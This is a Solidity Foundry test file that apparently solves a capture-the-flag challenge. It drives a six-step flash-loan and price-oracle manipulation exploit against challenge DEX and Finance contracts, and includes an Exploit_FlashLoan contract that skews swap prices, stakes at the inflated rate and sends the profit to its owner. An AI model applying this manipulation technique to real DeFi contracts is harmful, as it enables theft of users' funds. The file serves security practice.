//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test,console} from "forge-std/Test.sol";
import {DEX} from "src/DEX.sol";
import {Finance} from "src/Finance.sol";
import {Setup} from "src/Setup.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import "src/interfaces/IERC3156FlashBorrower.sol";
import {test_Flash_Loan} from "./Mocks/test_Flash_Loan.t.sol";
import {Currency} from "src/Currency.sol";

contract Solve is Test{
    address ADMIN=makeAddr("ADMIN");
    address LP=makeAddr("LIQUIDITY PROVIDER");
    address TESTER=makeAddr("TESTER");
    address Price_Fetcher=makeAddr("PRICE_FETCHER");
    DEX public dex;
    Finance public finance;
    Setup challSetup;
    address INR;
    address WETH;

    uint256 INR_LOAN_AMOUNT=50_000 * 2_30_000 ether;

    function setUp()public{
        startHoax(ADMIN,4_00_000 ether);
        challSetup=new Setup{value: 2_72_500 ether}();
        finance=challSetup.finance();
        dex=challSetup.dex();
        INR=dex.token1();
        WETH=dex.token0();
        vm.stopPrank();
    }

    
    function test_Solving_Chall()public{
        startHoax(TESTER,0);
        challSetup.claimBonus1();
        Exploit_FlashLoan exploit=new Exploit_FlashLoan{value:TESTER.balance}(WETH,INR,address(dex),address(finance));
        vm.warp(61);
        finance.snapshot();//1
        ////////////////////////   STEP1  ////////////////////////////
        console.log("----------------------------");
        console.log("-----------STEP-1-----------");
        console.log("----------------------------");
        bytes memory data;
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)),INR, INR_LOAN_AMOUNT, data);
        (uint256 _wethpriceAfterStep1,uint256 _inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        uint256 INR_BALANCE_AFTER_STEP1=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP1=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP1=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-1 :",WETH_BALANCE_AFTER_STEP1);
        console.log("INR BALANCE AFTER STEP-1  :",INR_BALANCE_AFTER_STEP1);
        console.log("ETH BALANCE AFTER STEP-1  :",ETH_BALANCE_AFTER_STEP1);
        // The price will be 4x of initial price. At the end though we made the swap price same as before it
        // wont update beacuse with in a single timestamp _update will update only once. So manipulated price 
        // remains constant. In order to get the previous swap rates we need to get new snapshot and price.

        ////////////////////////   STEP2  ////////////////////////////
        console.log("----------------------------");
        console.log("-----------STEP-2-----------");
        console.log("----------------------------");
        finance.snapshot();//61
        vm.warp(62);
        //console.log(finance.lastSnapshotTime());
        dex.sync();
        uint256 INR_BALANCE_DURING_STEP2=IERC20(INR).balanceOf(TESTER);
        IERC20(INR).transfer(address(finance), INR_BALANCE_DURING_STEP2);
        finance.withdraw(INR,INR_BALANCE_DURING_STEP2 );
        finance.stake{value: 50_000 ether}(WETH);
        challSetup.claimBonus2();
        IERC20(WETH).transfer(address(finance), 50_000 ether);
        finance.withdraw(WETH, 50_000 ether);
        finance.stake{value:33_350 ether}(INR);
        uint256 INR_BALANCE_AFTER_STEP2=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP2=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP2=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-2 :",WETH_BALANCE_AFTER_STEP2);
        console.log("INR BALANCE AFTER STEP-2  :",INR_BALANCE_AFTER_STEP2);
        console.log("ETH BALANCE AFTER STEP-2  :",ETH_BALANCE_AFTER_STEP2);
        
        /* 
        During this step the player will have 50_000 weth alog with him. He might exchange 25_000 WETH for INR
        and 25_000 WETH for ETH then inflate the price of INR in DEX and deposit 25_000 WETH and benefit some
        INR tokens. 
        */

        //27_000ETH and 33_000INR
        console.log("----------------------------");
        console.log("-----------STEP-3-----------");
        console.log("----------------------------");
        
        
        vm.warp(121);
        finance.snapshot();//62
        
        uint256 _inrToTransfer=IERC20(INR).balanceOf(TESTER);
        IERC20(INR).transfer(address(dex), _inrToTransfer);

        dex.swap(INR, _inrToTransfer, 0, TESTER);
        
        ( _wethpriceAfterStep1, _inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        
        
        finance.stake{value: 26_650 ether}(INR);

        uint256 _wethToTransfer=IERC20(WETH).balanceOf(TESTER);
        IERC20(WETH).transfer(address(dex), _wethToTransfer);
        dex.swap(WETH, _wethToTransfer, 0, TESTER);

        uint256 INR_BALANCE_AFTER_STEP3=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP3=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP3=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-3 :",WETH_BALANCE_AFTER_STEP3);
        console.log("INR BALANCE AFTER STEP-3  :",INR_BALANCE_AFTER_STEP3);
        console.log("ETH BALANCE AFTER STEP-3  :",ETH_BALANCE_AFTER_STEP3);

        console.log(dex.swaps_count());
        
        console.log("----------------------------");
        console.log("-----------STEP-4-----------");
        console.log("----------------------------");

        vm.warp(122);
        finance.snapshot();
        dex.sync();
        
        uint256 _inrBalanceDuringStep4=IERC20(INR).balanceOf(TESTER);
        uint256 _adjustedAmount=8303 ether * 2_30_000; //9002 is max value
        uint256 _inrToSwap_For_ETH=(_inrBalanceDuringStep4/2)-_adjustedAmount;
        IERC20(INR).transfer(address(finance),_inrToSwap_For_ETH);
        finance.withdraw(INR, _inrToSwap_For_ETH);
        uint256 INR_BALANCE_AFTER_STEP4=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP4=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP4=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-4 :",WETH_BALANCE_AFTER_STEP4);
        console.log("INR BALANCE AFTER STEP-4  :",INR_BALANCE_AFTER_STEP4);
        console.log("ETH BALANCE AFTER STEP-4  :",ETH_BALANCE_AFTER_STEP4);

        console.log("----------------------------");
        console.log("-----------STEP-5-----------");
        console.log("----------------------------");

        vm.warp(181);
        finance.snapshot();
        _inrToTransfer=IERC20(INR).balanceOf(TESTER);
        IERC20(INR).transfer(address(dex),_inrToTransfer);
        uint256 _amountsIn= _inrToTransfer >50_000 ether * 2_30_000?50_000 ether * 2_30_000:_inrToTransfer;
        uint256 _wethReceived=dex.swap(INR, _amountsIn, 0, TESTER);
        
        uint256 _inrReceived=finance.stake{value: TESTER.balance}(INR);
        IERC20(WETH).transfer(address(dex), _wethReceived);
        dex.swap(WETH, _wethReceived, 0, TESTER);
        
        uint256 INR_BALANCE_AFTER_STEP5=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP5=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP5=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-5 :",WETH_BALANCE_AFTER_STEP5);
        console.log("INR BALANCE AFTER STEP-5  :",INR_BALANCE_AFTER_STEP5);
        console.log("ETH BALANCE AFTER STEP-5  :",ETH_BALANCE_AFTER_STEP5);

        console.log("----------------------------");
        console.log("-----------STEP-6-----------");
        console.log("----------------------------");

        vm.warp(182);
        finance.snapshot();
        dex.sync();

        IERC20(INR).transfer(address(finance), 1_89_836 ether  *2_30_000 );
        finance.withdraw(INR, 1_89_836 ether *2_30_000);

        finance.stake{value: 1_00_000 ether}(WETH);
        challSetup.solve();
        uint256 INR_BALANCE_AFTER_STEP6=IERC20(INR).balanceOf(TESTER);
        uint256 WETH_BALANCE_AFTER_STEP6=IERC20(WETH).balanceOf(TESTER);
        uint256 ETH_BALANCE_AFTER_STEP6=TESTER.balance;
        console.log("WETH BALANCE AFTER STEP-6 :",WETH_BALANCE_AFTER_STEP6);
        console.log("INR BALANCE AFTER STEP-6  :",INR_BALANCE_AFTER_STEP6);
        console.log("ETH BALANCE AFTER STEP-6  :",ETH_BALANCE_AFTER_STEP6);

    }


    function test_Unintended_Solve_After_Step1()public{
        startHoax(TESTER,12_501 ether);
        Exploit_FlashLoan exploit=new Exploit_FlashLoan{value: 12_500 ether}(WETH,INR,address(dex),address(finance));
        vm.warp(61);
        finance.snapshot();



        
        ////////////////////////   STEP1  ////////////////////////////
        console.log("----------------------------");
        console.log("-----------STEP-1-----------");
        console.log("----------------------------");
        bytes memory data;
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)),INR, INR_LOAN_AMOUNT, data);
        (uint256 _wethpriceAfterStep1,uint256 _inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        finance.snapshot();
        vm.warp(62);
        //console.log(finance.lastSnapshotTime());
        dex.sync();
        uint256 INR_BALANCE_DURING_STEP2=IERC20(INR).balanceOf(TESTER);

        vm.warp(121);
        finance.snapshot();

        IERC20(INR).transfer(address(dex), (INR_BALANCE_DURING_STEP2*3)/5 );
        dex.swap(INR,(INR_BALANCE_DURING_STEP2*3)/5  , 0, TESTER);


        ( _wethpriceAfterStep1, _inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        console.log("SWAPS COUNT :",dex.swaps_count());
    }
}


contract Exploit_FlashLoan is IERC3156FlashBorrower{
    uint256 public lastWethLoanReceived;
    uint256 public lastInrLoanReceived;
    address WETH;
    address INR;
    DEX dex;
    Finance public finance;
    address owner;
    constructor(address _weth,address _inr,address _dex,address _finance) payable {
        WETH=_weth;
        INR=_inr;
        dex=DEX(_dex);
        finance=Finance(_finance);
        owner=msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        if(token==WETH){
            lastWethLoanReceived=amount;
        }else if(token==INR){
            lastInrLoanReceived=amount;
        }
        
        IERC20(token).transfer(address(dex), amount);
        dex.swap(token, amount, 0, address(this));

        finance.stake{value : address(this).balance}(INR);
        uint256 _balance=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(address(dex), _balance);
        dex.swap(WETH, _balance, 0, address(this));
        (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
        //console.log("WETH PRICE IN INR :",_wethprice);


        IERC20(token).approve(msg.sender, amount);
        uint256 _balance_after_exploit=IERC20(INR).balanceOf(address(this));
        //console.log("INR BALANCE OF EXPLOITER AFTER EXPLOIT :",_balance_after_exploit-amount);
        IERC20(token).transfer(owner,_balance_after_exploit-amount);
        
        return bytes32(data);
    }  

    receive()external payable{

    }
}

